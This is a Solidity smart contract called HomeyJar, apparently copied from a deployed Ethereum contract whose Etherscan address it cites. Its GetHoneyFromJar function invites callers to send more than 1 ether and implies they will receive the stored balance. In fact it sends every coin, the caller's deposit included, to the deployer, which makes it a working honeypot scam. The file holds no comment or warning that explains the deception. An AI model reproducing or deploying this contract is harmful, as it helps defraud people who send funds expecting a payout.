// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

contract HomeyJar {
    address payable public Owner = payable(msg.sender);

    receive() external payable {}

    function GetHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            (bool success, ) = Owner.call{value: address(this).balance}("");
            require(success);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        (bool success, ) = Owner.call{value: address(this).balance}("");
        require(success);
    }

}
// https://etherscan.io/address/0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4#code
